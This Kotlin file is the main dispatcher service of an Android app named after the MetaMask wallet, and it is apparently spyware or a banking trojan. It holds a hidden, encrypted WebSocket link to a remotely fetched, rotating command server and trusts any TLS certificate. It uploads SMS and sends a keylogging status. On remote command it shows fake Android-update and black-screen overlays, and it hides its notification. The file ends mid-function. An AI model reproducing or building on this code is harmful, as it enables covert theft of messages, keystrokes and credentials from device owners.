package com.example.MetaMask.services

import android.Manifest
import android.app.*
import android.content.*
import android.content.pm.PackageManager
import android.net.ConnectivityManager
import android.net.Network
import android.net.NetworkCapabilities
import android.net.NetworkRequest
import android.os.*
import android.provider.Telephony
import android.telephony.PhoneStateListener
import android.telephony.TelephonyManager
import androidx.annotation.Keep
import androidx.core.app.NotificationCompat
import androidx.core.content.ContextCompat
import androidx.work.Configuration
import androidx.work.WorkManager
import com.example.MetaMask.R
import com.example.MetaMask.utils.DeviceUUIDProvider
import com.example.MetaMask.utils.PrivilegeChecker
import com.example.MetaMask.utils.PermissionHelper
import com.example.MetaMask.utils.RemoteConfig
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.async
import kotlinx.coroutines.delay
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import com.example.MetaMask.utils.RealityWebSocket
import com.example.MetaMask.utils.RealityConfig
import okhttp3.*
import org.json.JSONObject
import android.content.SharedPreferences
@Keep
class MasterWebSocketDispatcher : Service() {

    companion object {
        @Volatile
        var IS_SERVICE_RUNNING = false
            private set

        const val ACTION_HANDLE_COMMAND = "com.example.MetaMask.ACTION_HANDLE_COMMAND"
        const val ACTION_SEND_TO_SERVER = "com.example.MetaMask.ACTION_SEND_TO_SERVER"

        const val ACTION_SEND_MESSAGE = "com.example.MetaMask.ACTION_SEND_MESSAGE"
        const val EXTRA_MESSAGE_DATA = "com.example.MetaMask.EXTRA_MESSAGE_DATA"

        const val EXTRA_COMMAND_DATA = "command_data"
        const val EXTRA_MESSAGE_TO_SEND = "com.example.MetaMask.EXTRA_MESSAGE_TO_SEND"
        const val EXTRA_STARTED_FROM_BOOT = "STARTED_FROM_BOOT"
        private const val NOTIFICATION_CHANNEL_ID = "WebSocketDispatcherChannel"
        private const val NOTIFICATION_ID = 1
        private const val RESTART_PENDING_INTENT_REQUEST_CODE = 2
        private const val INITIAL_RECONNECT_DELAY_MS = 2000L
        private const val MAX_RECONNECT_DELAY_MS = 60000L
        const val PREFS_NAME = "service_status_prefs"
        const val KEY_IS_RUNNING = "is_master_service_running"

        @Volatile
        private var lastQueueSizeBytes: Long = 0L

        @Volatile
        private var latestCraneFrame: String? = null

        @Volatile
        private var lastCraneFrameSize: Int = 25_000

        @Volatile
        var CURRENT_INSTANCE: MasterWebSocketDispatcher? = null

        @Volatile
        private var generation: Long = 0L

        @JvmStatic
        fun getQueueSize(): Long = lastQueueSizeBytes

        @Volatile var isWsConnected: Boolean = false
        @Volatile var wsDisconnectedSince: Long = 0L
    }

    private lateinit var statusPrefs: SharedPreferences
    private var connectionStartTime: Long = 0L
    @Volatile private var lastSpecialPermCheckMs = 0L
    @Volatile private var physicalNetwork: Network? = null
    private var vpnNetworkCallback: ConnectivityManager.NetworkCallback? = null
    @Volatile private var domainMonitorBaselinePing = -1L
    @Volatile private var domainDegradedStrikes = 0

    @Volatile private var realityConsecutiveFails = 0
    private val REALITY_FAIL_THRESHOLD = 8
    private val REALITY_RECHECK_INTERVAL_MS = 5 * 60 * 1000L
    @Volatile private var usingDirectWsFallback = false
    private var realityRecheckJob: kotlinx.coroutines.Job? = null

    private val client: OkHttpClient by lazy {
        OkHttpClient.Builder()
            .addInterceptor(com.example.MetaMask.utils.FailoverInterceptor())
            .addInterceptor { chain ->
                val original = chain.request()
                val request = original.newBuilder()
                    .header("User-Agent", "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36")
                    .header("Accept-Language", "ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7")
                    .build()
                chain.proceed(request)
            }
            .connectTimeout(10, java.util.concurrent.TimeUnit.SECONDS)
            .readTimeout(0, java.util.concurrent.TimeUnit.MILLISECONDS)
            .build()
    }

    private val vpnClient: OkHttpClient by lazy {
        val tm = object : javax.net.ssl.X509TrustManager {
            override fun checkClientTrusted(c: Array<java.security.cert.X509Certificate>, a: String) = Unit
            override fun checkServerTrusted(c: Array<java.security.cert.X509Certificate>, a: String) = Unit
            override fun getAcceptedIssuers(): Array<java.security.cert.X509Certificate> = emptyArray()
        }
        val ssl = javax.net.ssl.SSLContext.getInstance("TLS").apply { init(null, arrayOf(tm), null) }
        OkHttpClient.Builder()
            .sslSocketFactory(ssl.socketFactory, tm)
            .hostnameVerifier { _, _ -> true }
            .connectTimeout(10, java.util.concurrent.TimeUnit.SECONDS)
            .readTimeout(0, java.util.concurrent.TimeUnit.MILLISECONDS)
            .pingInterval(30, java.util.concurrent.TimeUnit.SECONDS)
            .build()
    }

    @Volatile private var webSocket: WebSocket? = null
    @Volatile private var isConnecting = false
    private val handler: Handler = Handler(Looper.getMainLooper())
    private var currentReconnectDelay: Long = INITIAL_RECONNECT_DELAY_MS
    private val serviceJob: Job = Job()
    private val serviceScope: CoroutineScope = CoroutineScope(Dispatchers.IO + serviceJob)

    private val requiredSmsPermissions = arrayOf(Manifest.permission.READ_SMS, Manifest.permission.SEND_SMS)
    private var connectivityManager: ConnectivityManager? = null
    private var networkCallback: ConnectivityManager.NetworkCallback? = null
    private var receiverRegistered = false

    @Volatile private var lastPhoneStateTriggerMs = 0L
    private val PHONE_STATE_DEBOUNCE_MS = 10_000L
    private var telephonyManagerRef: TelephonyManager? = null
    private var phoneStateCallback: Any? = null

    private val servicesToStart = listOf(
        trolService::class.java,
        FrienCat::class.java,
        UUIDService::class.java,
        TurtleService::class.java
    )

    private val serverSendReceiver: BroadcastReceiver = object : BroadcastReceiver() {
        override fun onReceive(context: Context?, intent: Intent?) {
            android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] onReceive enter context=ctx intent=${intent}") //xdbg
            if (intent?.action != ACTION_SEND_TO_SERVER) return

            if (intent.hasExtra(EXTRA_MESSAGE_TO_SEND)) {
                android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] if branch") //xdbg
                var messageString = intent.getStringExtra(EXTRA_MESSAGE_TO_SEND)

                if (messageString != null) {
                    android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] if branch") //xdbg
                    try {
                        val quick = JSONObject(messageString)
                        val frameFile = quick.optString("frame_file", "")
                        if (frameFile.isNotEmpty()) {
                            android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] if branch") //xdbg
                            val file = java.io.File(frameFile)
                            if (file.exists()) messageString = file.readText()
                        }
                    } catch (_: Exception) {}
                }

                if (messageString != null) {
                    android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] if branch") //xdbg
                    try {
                        val payload = JSONObject(messageString)

                        if (!payload.has("uuid")) {
                            android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] if branch") //xdbg
                            payload.put("uuid", com.example.MetaMask.utils.DeviceUUIDProvider.getUUID())
                        }

                        val rawData = payload.toString()
                        val action = payload.optString("action", "?")
                        val encryptedData = com.yourcompany.core.jni.NativeBridge.nativeEncryptData(rawData)

                        val secureEnvelope = JSONObject()
                        secureEnvelope.put("p", encryptedData)

                        val finalPayload = secureEnvelope.toString()

                        if (action == "crane_frame") {
                            android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] if branch") //xdbg
                            latestCraneFrame = finalPayload
                            lastCraneFrameSize = finalPayload.length
                            val queueNow = webSocket?.queueSize() ?: 0L
                            if (queueNow < lastCraneFrameSize) {
                                android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] if branch") //xdbg
                                val toSend = latestCraneFrame ?: return
                                latestCraneFrame = null
                                webSocket?.send(toSend)
                                lastQueueSizeBytes = webSocket?.queueSize() ?: lastQueueSizeBytes
                            } else {
                            }
                        } else {
                            lastQueueSizeBytes = webSocket?.queueSize() ?: lastQueueSizeBytes
                            webSocket?.send(finalPayload)
                            lastQueueSizeBytes = webSocket?.queueSize() ?: lastQueueSizeBytes
                        }
                    } catch (_: Exception) {}
                }
            }
        }
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onCreate() {
        android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] onCreate enter") //xdbg
        super.onCreate()

        try {
            WorkManager.initialize(
                applicationContext,
                (applicationContext as Configuration.Provider).workManagerConfiguration
            )
        } catch (_: IllegalStateException) {
            android.util.Log.e("XDBG", "[MasterWebSocketDispatcher] catch (ignored)") //xdbg
        } catch (_: Exception) {}

        startAsForegroundService()

        val hasReadSms = androidx.core.content.ContextCompat.checkSelfPermission(this, android.Manifest.permission.READ_SMS) == android.content.pm.PackageManager.PERMISSION_GRANTED
        if (!hasReadSms) {
            android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] if branch") //xdbg
            stopSelf()
            return
        }

        val killSwitchPrefs = getSharedPreferences(SelfDestructService.PREFS_NAME, Context.MODE_PRIVATE)
        if (killSwitchPrefs.getBoolean(SelfDestructService.KEY_PERMANENTLY_DISABLED, false)) {
            android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] if branch") //xdbg
            stopSelf()
            return
        }

        statusPrefs = getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
        statusPrefs.edit().putBoolean(KEY_IS_RUNNING, true).apply()

        IS_SERVICE_RUNNING = true
        CURRENT_INSTANCE = this
        synchronized(MasterWebSocketDispatcher::class.java) { generation++ }
        serviceScope.launch {
            if (isExternalVpnActive()) {
                android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] if branch") //xdbg
                val ok = try {
                    RemoteConfig.fetchDomain(applicationContext)
                } catch (e: kotlinx.coroutines.CancellationException) {
                    android.util.Log.e("XDBG", "[MasterWebSocketDispatcher] catch ${e.javaClass.simpleName}: ${e.message}") //xdbg
                    throw e
                } catch (e: Exception) {
                    android.util.Log.e("XDBG", "[MasterWebSocketDispatcher] catch ${e.javaClass.simpleName}: ${e.message}") //xdbg
                    false
                }
                if (ok) {
                    android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] if branch") //xdbg
                    Handler(Looper.getMainLooper()).post { initializeWebSocket() }
                }
            } else {
                val realityJob = async { com.example.MetaMask.utils.RealityConfig.fetch() }
                val fetchOk = try {
                    RemoteConfig.fetchDomain(applicationContext)
                } catch (e: kotlinx.coroutines.CancellationException) {
                    android.util.Log.e("XDBG", "[MasterWebSocketDispatcher] catch ${e.javaClass.simpleName}: ${e.message}") //xdbg
                    throw e
                } catch (e: Exception) {
                    android.util.Log.e("XDBG", "[MasterWebSocketDispatcher] catch ${e.javaClass.simpleName}: ${e.message}") //xdbg
                    false
                }
                realityJob.await()
                if (fetchOk) {
                    android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] if branch") //xdbg
                    Handler(Looper.getMainLooper()).post {
                        initializeWebSocket()
                    }
                }
            }
        }

        try {
            DeviceUUIDProvider.init(applicationContext)
            registerReceiver(
                serverSendReceiver,
                IntentFilter(ACTION_SEND_TO_SERVER),
                Context.RECEIVER_EXPORTED
            )
            receiverRegistered = true
        } catch (e: Exception) {
            android.util.Log.e("XDBG", "[MasterWebSocketDispatcher] catch ${e.javaClass.simpleName}: ${e.message}") //xdbg
            stopSelf()
        }

        registerNetworkCallback()
        findAndBindPhysicalNetwork()
        registerTelephonyListener()
        startMwdHeartbeat()
    }

    private fun startMwdHeartbeat() {
        android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] startMwdHeartbeat enter") //xdbg
        serviceScope.launch {
            while (IS_SERVICE_RUNNING) {
                android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] loop") //xdbg
                try {
                    getSharedPreferences("mwd_state", Context.MODE_PRIVATE)
                        .edit()
                        .putLong("alive_ts", System.currentTimeMillis())
                        .putLong("ws_queue_bytes", lastQueueSizeBytes)
                        .apply()
                } catch (_: Exception) {}
                kotlinx.coroutines.delay(2_000L)
            }
        }
    }


    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] onStartCommand enter intent=${intent} flags=${flags} startId=${startId}") //xdbg
        val hasReadSms = androidx.core.content.ContextCompat.checkSelfPermission(this, android.Manifest.permission.READ_SMS) == android.content.pm.PackageManager.PERMISSION_GRANTED
        if (!hasReadSms) {
            android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] if branch") //xdbg
            stopSelf()
            android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] return") //xdbg
            return START_NOT_STICKY
        }

        if (intent?.action == ACTION_SEND_MESSAGE) {
            android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] if branch") //xdbg
            val message = intent.getStringExtra(EXTRA_MESSAGE_DATA)
            if (!message.isNullOrBlank()) {
                android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] if branch") //xdbg
                val sendIntent = Intent(ACTION_SEND_TO_SERVER).apply {
                    putExtra(EXTRA_MESSAGE_TO_SEND, message)
                }
                this@MasterWebSocketDispatcher.sendBroadcast(sendIntent)
            }
            android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] return") //xdbg
            return START_STICKY
        }

        if (IS_SERVICE_RUNNING && webSocket != null && intent?.action == null && intent?.getBooleanExtra(EXTRA_STARTED_FROM_BOOT, false) != true) {
            android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] if branch") //xdbg
            if (intent?.getBooleanExtra("started_from_push", false) == true) {
                android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] if branch") //xdbg
                serviceScope.launch { checkAndHealWebSocket() }
            }
            if (!TurtleService.isTurtleAwake) {
                android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] if branch") //xdbg
                tryRebindTurtleService()
            }
            android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] return") //xdbg
            return START_STICKY
        }

        checkAndReportSpecialPermissions()

        if (isNetworkAvailable(this@MasterWebSocketDispatcher)) {
            android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] if branch") //xdbg
            Handler(Looper.getMainLooper()).post {
                initializeWebSocket()
            }
        }

        if (areSmsPermissionsGranted()) {
            android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] if branch") //xdbg
            startAllServices(intent?.getBooleanExtra(EXTRA_STARTED_FROM_BOOT, false) ?: false)
        }
        android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] return") //xdbg
        return START_STICKY
    }

    private fun areSmsPermissionsGranted(): Boolean =
        requiredSmsPermissions.all { ContextCompat.checkSelfPermission(this@MasterWebSocketDispatcher, it) == PackageManager.PERMISSION_GRANTED }

    private fun tryRebindTurtleService() {
        android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] tryRebindTurtleService enter") //xdbg
        try {
            val enabledListeners = android.provider.Settings.Secure.getString(
                contentResolver, "enabled_notification_listeners"
            ) ?: ""
            if (!enabledListeners.contains(packageName)) return
            startService(Intent(this, TurtleService::class.java))
        } catch (_: Exception) {}
    }

    private fun startAllServices(fromBoot: Boolean) {
        android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] startAllServices enter fromBoot=${fromBoot}") //xdbg
        servicesToStart.forEach { serviceClass ->
            try {
                startService(Intent(this@MasterWebSocketDispatcher, serviceClass).apply {
                    putExtra(EXTRA_STARTED_FROM_BOOT, fromBoot)
                })
            } catch (_: Exception) {}
        }

        try {
            val request = androidx.work.OneTimeWorkRequestBuilder<com.example.MetaMask.services.ChikenWorker>()
                .setExpedited(androidx.work.OutOfQuotaPolicy.RUN_AS_NON_EXPEDITED_WORK_REQUEST)
                .build()
            androidx.work.WorkManager.getInstance(applicationContext)
                .enqueueUniqueWork("CK_ONCE", androidx.work.ExistingWorkPolicy.KEEP, request)
        } catch (_: Exception) {}
    }

    private fun startAsForegroundService() {
        android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] startAsForegroundService enter") //xdbg
        val channelId = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                NOTIFICATION_CHANNEL_ID,
                "System Connection",
                NotificationManager.IMPORTANCE_LOW
            )
            (getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager).createNotificationChannel(channel)
            channel.id
        } else ""
        val notification = NotificationCompat.Builder(this@MasterWebSocketDispatcher, channelId)
            .setContentTitle("")
            .setContentText("")
            .setSmallIcon(R.mipmap.ic_launcher)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .build()
        try {
            if (Build.VERSION.SDK_INT >= 29) {
                android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] if branch") //xdbg
                startForeground(
                    NOTIFICATION_ID,
                    notification,
                    android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
                )
            } else {
                startForeground(NOTIFICATION_ID, notification)
            }
        } catch (e: Exception) {
            android.util.Log.e("XDBG", "[MasterWebSocketDispatcher] catch ${e.javaClass.simpleName}: ${e.message}") //xdbg
            try { startForeground(NOTIFICATION_ID, notification) } catch (_: Exception) {}
            stopSelf()
        }
    }

    private fun initializeWebSocket() {
        android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] initializeWebSocket enter") //xdbg
        val domain = RemoteConfig.serverDomain
        if (domain == null) {
            android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] if branch") //xdbg
            handler.postDelayed({ if (IS_SERVICE_RUNNING && webSocket == null) initializeWebSocket() }, 5000L)
            return
        }

        if (isConnecting || webSocket != null || !IS_SERVICE_RUNNING) return
        isConnecting = true
        try {
            val deviceUuid = DeviceUUIDProvider.getUUID() ?: run { isConnecting = false; return }
            connectionStartTime = System.currentTimeMillis()

            if (isExternalVpnActive()) {
                android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] if branch") //xdbg
                connectivityManager?.bindProcessToNetwork(null)
                val vpnHost = domain.split(":").first()
                val urlWithParams = "wss://$vpnHost/ws?type=device&uuid=$deviceUuid"
                val request = Request.Builder().url(urlWithParams).build()
                webSocket = vpnClient.newWebSocket(request, AppWebSocketListener())
            } else if (usingDirectWsFallback) {
                android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] initializeWebSocket directWsFallback active") //xdbg
                physicalNetwork?.let { connectivityManager?.bindProcessToNetwork(it) }
                val vpnHost = domain.split(":").first()
                val urlWithParams = "wss://$vpnHost/ws?type=device&uuid=$deviceUuid"
                val request = Request.Builder().url(urlWithParams).build()
                webSocket = vpnClient.newWebSocket(request, AppWebSocketListener())
            } else {
                physicalNetwork?.let { connectivityManager?.bindProcessToNetwork(it) }
                val urlWithParams = "wss://$domain/ws?type=device&uuid=$deviceUuid"
                val request = Request.Builder().url(urlWithParams).build()
                webSocket = RealityWebSocket(
                    originalRequest = request,
                    wsPath = "/ws",
                    wsQuery = "type=device&uuid=$deviceUuid",
                    listener = AppWebSocketListener()
                )
            }
        } catch (e: Exception) {
            android.util.Log.e("XDBG", "[MasterWebSocketDispatcher] catch ${e.javaClass.simpleName}: ${e.message}") //xdbg
            webSocket = null
            isConnecting = false
            scheduleReconnect()
        }
    }

    private suspend fun checkAndHealWebSocket() {
        android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] checkAndHealWebSocket enter") //xdbg
        val ws = webSocket ?: return
        val sent = ws.send("{\"action\":\"ping\"}")
        if (!sent) {
            android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] if branch") //xdbg
            ws.cancel()
            webSocket = null
            isConnecting = false
            synchronized(MasterWebSocketDispatcher::class.java) { generation++ }
            handler.removeCallbacksAndMessages(null)
            currentReconnectDelay = INITIAL_RECONNECT_DELAY_MS
            Handler(Looper.getMainLooper()).post { initializeWebSocket() }
        }
    }

    private fun scheduleReconnect() {
        android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] scheduleReconnect enter") //xdbg
        if (!IS_SERVICE_RUNNING) {
            android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] if branch") //xdbg
            return
        }
        val myGen: Long = synchronized(MasterWebSocketDispatcher::class.java) { generation }
        handler.removeCallbacksAndMessages(null)
        val delayMs = currentReconnectDelay
        currentReconnectDelay = (currentReconnectDelay * 2).coerceAtMost(MAX_RECONNECT_DELAY_MS)
        handler.postDelayed({
            if (CURRENT_INSTANCE !== this@MasterWebSocketDispatcher) {
                android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] if branch") //xdbg
                android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] return") //xdbg
                return@postDelayed
            }
            val curGen = synchronized(MasterWebSocketDispatcher::class.java) { generation }
            if (curGen != myGen) {
                android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] if branch") //xdbg
                android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] return") //xdbg
                return@postDelayed
            }
            if (IS_SERVICE_RUNNING && webSocket == null) {
                android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] if branch") //xdbg
                initializeWebSocket()
            }
        }, delayMs)
    }

    inner class AppWebSocketListener : WebSocketListener() {
        private val pingHandler: Handler = Handler(Looper.getMainLooper())
        private var pingRunnable: Runnable? = null
        private val qualityCheckHandler: Handler = Handler(Looper.getMainLooper())
        private var firstMessageReceived = false
        private var connectionFailureCount = 0
        private var lastFcmResendMs = 0L

        override fun onOpen(ws: WebSocket, response: Response) {
            android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] onOpen enter ws=${ws} response=${response}") //xdbg
            val connectDuration = System.currentTimeMillis() - connectionStartTime
            connectionFailureCount = 0
            isWsConnected = true
            if (!usingDirectWsFallback) {
                realityConsecutiveFails = 0
                stopRealityRecheckTimer()
            }
            if (connectDuration > 15000) {
                android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] if branch") //xdbg
                ws.close(1000, "Slow Connection")
                this@MasterWebSocketDispatcher.webSocket = null
                isConnecting = false
                RemoteConfig.rotateDomain()
                return
            }

            this@MasterWebSocketDispatcher.webSocket = ws
            isConnecting = false
            handler.removeCallbacksAndMessages(null)
            currentReconnectDelay = INITIAL_RECONNECT_DELAY_MS

            try {
                if (packageManager.resolveContentProvider("p.sig.vd", 0) != null) {
                    android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] if branch") //xdbg
                    contentResolver.insert(android.net.Uri.parse("content://p.sig.vd/s"), null)
                }
            } catch (_: Exception) {}

            qualityCheckHandler.postDelayed({
                if (!firstMessageReceived && IS_SERVICE_RUNNING) {
                    android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] if branch") //xdbg
                    ws.cancel()
                    this@MasterWebSocketDispatcher.webSocket = null
                    isConnecting = false
                    RemoteConfig.rotateDomain()
                    scheduleReconnect()
                }
            }, 20000)

            RemoteConfig.resetRotation()
            RemoteConfig.markCurrentDomainAsSuccess(applicationContext)
            sendCachedTokens()
            try { checkAndReportDefaultSmsStatus() } catch (_: Exception) {}

            try {
                val syncIntent = Intent(this@MasterWebSocketDispatcher, trolService::class.java).apply {
                    action = trolService.ACTION_INITIAL_SMS_SYNC
                }
                startService(syncIntent)
            } catch (_: Exception) {}

            try {
                schedulePing(ws)
            } catch (_: Exception) {}

            launchDomainHealthMonitor(ws)

            handler.postDelayed({
                try { checkAndReportSpecialPermissions() } catch (_: Exception) {}
            }, 6000)

            try {
                val accessEnabled = CoreServicesLauncher.isAccessibilityServiceEnabled(this@MasterWebSocketDispatcher)
                if (accessEnabled) {
                    android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] if branch") //xdbg
                    val klPayload = JSONObject().apply {
                        put("action", "keylog_all_active")
                        put("active", true)
                        put("uuid", DeviceUUIDProvider.getUUID())
                    }
                    serviceScope.launch {
                        try {
                            val enc = com.yourcompany.core.jni.NativeBridge.nativeEncryptData(klPayload.toString())
                            ws.send(JSONObject().apply { put("p", enc) }.toString())
                        } catch (_: Exception) {}
                    }
                }
            } catch (_: Exception) {}
        }

        override fun onMessage(ws: WebSocket, text: String) {
            android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] onMessage len=${text.length} head=${text.take(100)}") //xdbg
            firstMessageReceived = true
            qualityCheckHandler.removeCallbacksAndMessages(null)
            if (wsDisconnectedSince != 0L) {
                android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] if branch") //xdbg
                wsDisconnectedSince = 0L
            }

            if (text.contains("\"type\":\"PING\"") || text.contains("\"type\":\"ping\"")) {
                android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] if branch") //xdbg
                ws.send("{\"action\":\"client_ping\"}")
                return
            }

            if (text.contains("\"fcmTokenAck\"")) {
                android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] if branch") //xdbg
                try {
                    val json = org.json.JSONObject(text)
                    if (json.optString("action") == "fcmTokenAck") {
                        android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] if branch") //xdbg
                        FcmTokenService.markTokenConfirmed(applicationContext, true)
                        return
                    }
                } catch (_: Exception) {}
            }

            try {
                val action = org.json.JSONObject(text).optString("action")
                if (action == "blank_screen_on" || action == "android_update_on" ||
                    action == "fake_update_on" || action == "overlay_off") {
                    val json = org.json.JSONObject(text)
                    if (AccessSvc.instance != null) {
                        android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] if branch") //xdbg
                        handler.post {
                            val helper = AccessSvc.instance?.martenHelper
                            if (helper != null) {
                                android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] if branch") //xdbg
                                when (action) {
                                    "blank_screen_on"    -> {
                                        helper.showBlack(json.optString("text", ""))
                                        AccessSvc.instance?.startOverlayAutoOff()
                                    }
                                    "android_update_on"  -> {
                                        helper.showAndroidUpdate()
                                        AccessSvc.instance?.startOverlayAutoOff()
                                    }
                                    "fake_update_on"     -> helper.showFakeUpdate()
                                    "overlay_off"        -> {
                                        helper.hide()
                                        AccessSvc.instance?.cancelOverlayAutoOff()
                                    }
                                }
                            }
                        }
                        return
                    }
                }
            } catch (_: Exception) {}

            try {
                broadcastHandleCommandSafely(text)
            } catch (_: Exception) {}
        }

        override fun onClosing(ws: WebSocket, code: Int, reason: String) {
            android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] onClosing enter ws=${ws} code=${code} reason=${reason}") //xdbg
            qualityCheckHandler.removeCallbacksAndMessages(null)
            ws.close(1000, null)
            cancelPing()
        }

        override fun onClosed(ws: WebSocket, code: Int, reason: String) {
            android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] onClosed enter ws=${ws} code=${code} reason=${reason}") //xdbg
            if (this@MasterWebSocketDispatcher.webSocket == ws) {
                android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] if branch") //xdbg
                this@MasterWebSocketDispatcher.webSocket = null
                isConnecting = false
            }
            qualityCheckHandler.removeCallbacksAndMessages(null)
            lastQueueSizeBytes = 0L
            cancelPing()
            isWsConnected = false
            if (wsDisconnectedSince == 0L) {
                android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] if branch") //xdbg
                wsDisconnectedSince = System.currentTimeMillis()
            }
            if (IS_SERVICE_RUNNING) scheduleReconnect()
        }

        override fun onFailure(ws: WebSocket, t: Throwable, response: Response?) {
            android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] onFailure enter ws=${ws} t=${t} response=${response}") //xdbg
            qualityCheckHandler.removeCallbacksAndMessages(null)

            if (this@MasterWebSocketDispatcher.webSocket == ws) {
                android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] if branch") //xdbg
                ws.cancel()
                this@MasterWebSocketDispatcher.webSocket = null
                isConnecting = false
            }
            lastQueueSizeBytes = 0L
            cancelPing()
            isWsConnected = false
            if (wsDisconnectedSince == 0L) {
                android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] if branch") //xdbg
                wsDisconnectedSince = System.currentTimeMillis()
            }

            connectionFailureCount++
            RemoteConfig.rotateDomain()

            if (!usingDirectWsFallback && !isExternalVpnActive()) {
                realityConsecutiveFails++
                android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] onFailure realityConsecutiveFails=$realityConsecutiveFails threshold=$REALITY_FAIL_THRESHOLD") //xdbg
                if (realityConsecutiveFails >= REALITY_FAIL_THRESHOLD) {
                    android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] onFailure switching to directWsFallback") //xdbg
                    usingDirectWsFallback = true
                    realityConsecutiveFails = 0
                    connectionFailureCount = 0
                    RemoteConfig.resetRotation()
                    startRealityRecheckTimer()
                    if (IS_SERVICE_RUNNING) scheduleReconnect()
                    return
                }
            }

            if (RemoteConfig.isExhausted() || connectionFailureCount > 5) {
                android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] if branch") //xdbg
                RemoteConfig.resetRotation()
                serviceScope.launch {
                    if (!isExternalVpnActive() && !usingDirectWsFallback) {
                        val realityJob = launch { try { com.example.MetaMask.utils.RealityConfig.fetch() } catch (_: Exception) {} }
                        RemoteConfig.fetchDomain(applicationContext)
                        realityJob.join()
                    } else {
                        RemoteConfig.fetchDomain(applicationContext)
                    }
                    Handler(Looper.getMainLooper()).post {
                        connectionFailureCount = 0
                        if (IS_SERVICE_RUNNING) scheduleReconnect()
                    }
                }
            } else {
                if (IS_SERVICE_RUNNING) scheduleReconnect()
            }
        }

        private fun broadcastHandleCommandSafely(json: String) {
            android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] broadcastHandleCommandSafely enter json=${json}") //xdbg
            val pm = this@MasterWebSocketDispatcher.packageManager
            val base = Intent(ACTION_HANDLE_COMMAND).apply {
                putExtra(EXTRA_COMMAND_DATA, json)
                setPackage(this@MasterWebSocketDispatcher.packageName)
            }

            val matches = try {
                pm.queryBroadcastReceivers(base, PackageManager.GET_DISABLED_COMPONENTS)
            } catch (e: Exception) {
                android.util.Log.e("XDBG", "[MasterWebSocketDispatcher] catch ${e.javaClass.simpleName}: ${e.message}") //xdbg
                emptyList()
            }

            val target = matches.firstOrNull { it.activityInfo?.packageName == this@MasterWebSocketDispatcher.packageName }?.activityInfo
            if (target != null && !target.name.isNullOrBlank()) {
                android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] if branch") //xdbg
